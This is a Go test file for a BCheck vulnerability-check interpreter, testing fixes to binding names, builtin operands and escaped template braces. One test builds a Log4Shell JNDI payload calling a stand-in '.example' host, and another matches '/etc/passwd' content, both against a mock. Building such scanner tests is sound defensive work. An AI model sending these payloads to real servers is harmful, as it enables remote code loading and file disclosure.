package bcheck

import (
	"strings"
	"testing"
)

// Three interpreter defects the bundled-corpus sweep found (burpsy-react-ui-0vzb.21). Each one left
// PortSwigger checks parsing cleanly and never able to report.

// `send request called check:` is the most common binding name in the corpus (66 of the active
// checks). `check` used to be an alias for the base exchange, so `{check.response.status_code}`
// read nothing and every one of those checks compared against an absent value.
func TestASendCalledCheckIsReadBackByThatName(t *testing.T) {
	m := &mockSink{replies: []mockReply{{body: withStatus("418", "probe-only marker")}}}
	f, err := runActive(t, `given host then
    send request called check:
        method: "GET"
        path: "/probe"
    if {check.response.status_code} is "418" and "probe-only marker" in {check.response.body} then
        report issue:
            severity: info
            confidence: firm
            detail: "x"
            remediation: "y"
    end if
`, m)
	if err != nil {
		t.Fatal(err)
	}
	if len(f) != 1 {
		t.Fatalf("got %d findings, want 1: the send called check was not what {check.response} read", len(f))
	}
}

// With no send of that name, `check` still answers as the base exchange — the alias the Go port's
// own callers may rely on is kept, only shadowed by a real binding.
func TestCheckWithoutABindingStillMeansTheBaseExchange(t *testing.T) {
	ctx := activeCtx()
	if v, ok := ctx.resolvePathOpt("check.response.status_code"); !ok || v != "200" {
		t.Fatalf("{check.response.status_code} with no send called check = %q, %v; want the base exchange's 200", v, ok)
	}
}

// A builtin call is a comparison operand the corpus writes (`"root:x:0:0:" in
// {to_lower(check1.response.body)}`). It used to be resolved as a path, read as unresolved, and make
// the comparison false.
func TestABuiltinCallIsEvaluatedAsAComparisonOperand(t *testing.T) {
	m := &mockSink{replies: []mockReply{{body: ok200("ROOT:X:0:0:root")}}}
	f, err := runActive(t, `given host then
    send request called check1:
        method: "GET"
        path: "/p"
    if "root:x:0:0:" in {to_lower(check1.response.body)} then
        report issue:
            severity: info
            confidence: firm
            detail: "x"
            remediation: "y"
    end if
`, m)
	if err != nil {
		t.Fatal(err)
	}
	if len(f) != 1 {
		t.Fatalf("got %d findings, want 1: to_lower() as an operand was not evaluated", len(f))
	}
}

// `\{` in a backtick template is a literal brace. The lexer used to unescape it and interpolate
// then read the brace as a reference, so log4shell's `$\{jndi:ldap://…/a}` and every fastjson JSON
// payload went out as an unresolved reference.
func TestAnEscapedBraceInATemplateIsSentLiterally(t *testing.T) {
	m := &mockSink{}
	_, err := runActive(t, `define:
    payload = `+"`"+`$\{jndi:ldap://{random_str(4)}.example/a}`+"`"+`
given host then
    send request:
        method: "GET"
        path: `+"`"+`/x?q={payload}`+"`"+`
`, m)
	if err != nil {
		t.Fatal(err)
	}
	sent := m.first()
	if !strings.Contains(sent, "${jndi:ldap://") || !strings.Contains(sent, ".example/a}") {
		t.Fatalf("the escaped brace was not sent literally; request line: %q", strings.SplitN(sent, "\r\n", 2)[0])
	}
	if strings.Contains(sent, "{random_str") {
		t.Fatalf("the nested reference inside the escaped braces was not resolved: %q", strings.SplitN(sent, "\r\n", 2)[0])
	}
}
